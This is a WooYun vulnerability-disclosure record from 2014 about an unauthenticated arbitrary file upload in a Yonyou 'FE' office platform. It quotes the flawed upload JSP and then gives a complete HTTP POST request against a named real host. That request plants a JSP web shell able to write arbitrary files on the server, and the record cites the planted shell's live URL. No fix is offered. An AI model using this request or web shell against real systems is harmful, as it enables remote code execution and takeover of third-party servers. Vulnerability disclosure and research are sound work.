{"id": 202, "wybug_id": "wooyun-2014-071838", "wybug_title": "用友某办公平台任意文件上传导致代码执行漏洞（无需登录）", "wybug_corp": "用友软件", "wybug_author": "路人甲", "wybug_date": "2014-08-10 17:56", "wybug_open_date": "2014-11-05 17:58", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-15：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-05：\t细节向公众公开  简要描述：  详细说明：  上一枚： WooYun: 用友某办公平台任意文件上传导致代码执行漏洞（全版本）  intitle:\"fe协作\"看问题代码在\\system\\mediafile\\fileupload.jsp中\n<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java.sql.*\" errorPage=\"\" %><%@ page import=\"java.io.*\"%> <%@ page import=\"java.util.*\"%> <%@ page import=\"fe.util.*\"%> <%@ page import=\"fe.upload.*\"%><jsp:directive.page import=\"fe.sys.User\"/><jsp:directive.page import=\"fe.res.ResourceManage\"/> <%\tString path = request.getParameter(\"path\");\tString state=request.getParameter(\"state\");\trequest.setCharacterEncoding(\"GBK\");\tif(state==null || \"\".equals(state)){\t\tUploadFile up=new UploadFile(request);\t\tup.setSavePath(path);\t\tString message=up.writeFile(true);\t\t%>\t\t\t<script language=\"javascript\">\t\t\t\talert(\"<%=message%>\");\t\t\t\tvar reloadSrc1=opener;\t\t\t\tvar href=reloadSrc1.location.href;\t\t\t\tvar index=href.indexOf(\"done\");\t\t\t\tif(index>0)\t\t\t\thref=href.substring(0,index);\t\t\t\treloadSrc1.location.href=href;\t\t\t\twindow.close();\t\t\t\t</script>\t\t<%\t\treturn;\t}%><HTML><HEAD><TITLE>文件选择</TITLE><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GBK\"><style type=\"text/css\">body, a, table, div, span, td, th, input, select{font:9pt;font-family: \"宋体\", Verdana, Arial, Helvetica, sans-serif;}body {padding:5px}</style><link href=\"/style1.css\" rel=\"stylesheet\" type=\"text/css\"><script language=\"JavaScript\" src=\"/js35/XHConn.js\"></script><script language=\"JavaScript\">//var filepath=\"\";var img=null; \tfunction ok(){\t\tvar fileName=document.all.file1.value;\t\tif(fileName.indexOf(\"\\\\\")!=-1)\t\t\tfileName=fileName.substring(fileName.lastIndexOf(\"\\\\\")+1);\t\t\t\tif(fileName==null || fileName==\"\"){\t\t\t\t\t\talert(\"请选择上传文件！\");\t\t\treturn;\t\t}\t\telse{\t\t    if(fileName.toLowerCase().lastIndexOf(\".doc\")!=fileName.length-4){\t\t      alert(\"系统只是支持上传DOC文件，请选择其他文件！\");\t\t      return;\t\t    }\t\t\tvar myConn = new XHConn();\t\t\tif(myConn){\t\t\t\t myConn.connect(\"checkfile.jsp\", \"POST\", \"type=file&fileName=\"+fileName+\"&path=<%=path %>\", checkName);\t\t\t}\t\t\t\t}\t\t\t}\t\tfunction checkName(oXML){\t\tvar state=oXML.responseText;\t\t\tif(state.indexOf(\"#hasFile\")!=-1){\t\t\tif(!window.confirm(\"文件已存在,是否覆盖?\")){\t\t\t\treturn;\t\t\t}\t\t}\t\t\t\tdocument.all.form1.submit();\t\tdocument.all.divProcessing.style.display=\"inline\";\t}</script><BODY bgColor=\"#E0F0FE\" style=\"margin:0px;\"><form name=\"form1\" action=\"fileupload.jsp?path=<%=path %>\" method=\"post\" enctype=\"multipart/form-data\"><table width=\"317\" height=\"81\" border=0 align=center cellpadding=0 cellspacing=0><tr>  <td>上传文件不能大于10M(只能上传DOC文件)</td></tr><tr>\t<td width=\"317\" height=\"56\">\t\t<fieldset>\t<legend>文件来源</legend>\t<table border=0 cellpadding=0 cellspacing=0 width=\"100%\">\t\t<tr>\t\t\t<td align=\"right\"><input type=\"file\" name=\"file1\" id=\"file1\"size=\"35\"></td>\t\t</tr>\t</table>\t</fieldset>\t</td></tr><tr><td height=5>&nbsp;</td></tr><tr><td height=5>&nbsp;</td></tr><tr><td height=\"20\" align=right><input class=\"singleInputButton\" type=\"button\" value='  确定  ' id=Ok onclick=\"ok()\">&nbsp;&nbsp;<input class=\"singleInputButton\" type=button value='  取消  ' onclick=\"window.close();\"></td></tr></table></form><div id=divProcessing style=\"width:200px;height:30px;position:absolute;left:70px;top:30px;display:none\"><table border=0 cellpadding=0 cellspacing=1 bgcolor=\"#000000\" width=\"100%\" height=\"100%\"><tr><td bgcolor=#3A6EA5><marquee align=\"middle\" behavior=\"alternate\" scrollamount=\"5\"><font color=#FFFFFF>...文件上传中...请等待...</font></marquee></td></tr></table></div></body></html>\n分析如下：\nString path = request.getParameter(\"path\");//获取路径\tString state=request.getParameter(\"state\");//状态\trequest.setCharacterEncoding(\"GBK\");\tif(state==null || \"\".equals(state)){\t\tUploadFile up=new UploadFile(request); //直接获取reuqest包\t\tup.setSavePath(path); //保存到目标路径\n利用证明如下：\nPOST /system/mediafile/fileupload.jsp?path=D:\\FE\\jboss\\server\\default\\.\\deploy\\fe.war\\ HTTP/1.1Host: oa.peizheng.net.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://oa.peizheng.net.cn/system/mediafile/fileupload.jsp?path=1&state=2Cookie: JSESSIONID=197566F74F854A9E06551298A76CCCE8Connection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------155811815622246Content-Length: 2215-----------------------------155811815622246Content-Disposition: form-data; name=\"file1\"; filename=\"test.jsp\"Content-Type: application/msword<%@page contentType=\"text/html;charset=gb2312\"%>   <%@page import=\"java.io.*,java.util.*,java.net.*\"%>   <html>     <head>       <title>JspDo Code By Xiao.3</title>       <style type=\"text/css\">        body { color:red; font-size:12px; background-color:white; }       </style>     </head>     <body>     <%      if(request.getParameter(\"context\")!=null)      {      String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");      String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");      OutputStream pt = null;           try {               pt = new FileOutputStream(path);               pt.write(context.getBytes());               out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getRequestURI()+\"'><font color='red' title='µã»÷¿ÉÒÔ×ªµ½ÉÏ´«µÄÎÄ¼þÒ³Ãæ!'>ÉÏ´«³É¹¦!</font></a>\");           } catch (FileNotFoundException ex2) {               out.println(\"<font color='red'>ÉÏ´«Ê§°Ü!</font>\");           } catch (IOException ex) {               out.println(\"<font color='red'>ÉÏ´«Ê§°Ü!</font>\");           } finally {               try {                   pt.close();               } catch (IOException ex3) {                   out.println(\"<font color='red'>ÉÏ´«Ê§°Ü!</font>\");               }           }   }     %>       <form name=\"frmUpload\" method=\"post\" action=\"\">       <font color=\"blue\">±¾ÎÄ¼þµÄÂ·¾¶:</font><%out.print(request.getRealPath(request.getServletPath())); %>       <br>       <br>       <font color=\"blue\">ÉÏ´«ÎÄ¼þÂ·¾¶:</font><input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServletContext().getRealPath(\"/\")); %>\">       <br>       <br>       ÉÏ´«ÎÄ¼þÄÚÈÝ:<textarea name=\"context\" id=\"context\" style=\"width: 51%; height: 150px;\"></textarea>       <br>       <br>       <input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">       </form>     </body>   </html>  -----------------------------155811815622246--\nshell直接在根目录当中，为test.jsphttp://oa.peizheng.net.cn/test.jsp\n\n   漏洞证明：  http://oa.peizheng.net.cn/test.jsp\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-05 17:58 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}